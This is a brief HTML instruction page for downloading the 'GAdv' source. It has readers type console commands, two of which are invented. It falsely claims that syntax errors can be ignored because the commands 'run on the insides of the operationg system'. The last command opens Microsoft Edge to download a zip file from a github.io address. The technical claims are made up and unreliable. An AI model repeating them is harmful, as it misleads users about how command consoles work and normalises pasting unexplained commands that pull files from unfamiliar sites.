  <h1 style="font-family:Product Sans">How to download the Source</h1>
  <p style="font-family:Product Sans">To download the source, you need to go to the console and type <code>interger gitreps gadv zip focus</code> to make the system focus on the repository's CLI. It is ok if it says the syntax is incorrect, but actually those codes run on the insides of the operationg system, so it is ok. Then you type the code <code>nav dir cdbopfiles-collai1238102847923749283759879-24932934823-file</code>. The final code to type is <code>start msedge https://sai-corp.github.io/Google-Adv/Developers/cdbopfiles-collai1238102847923749283759879-24932934823-file/sean/files/downloadsource/GAdv-opened-zipfile.zip</code>. Now, in your browser, a download should be loaded.
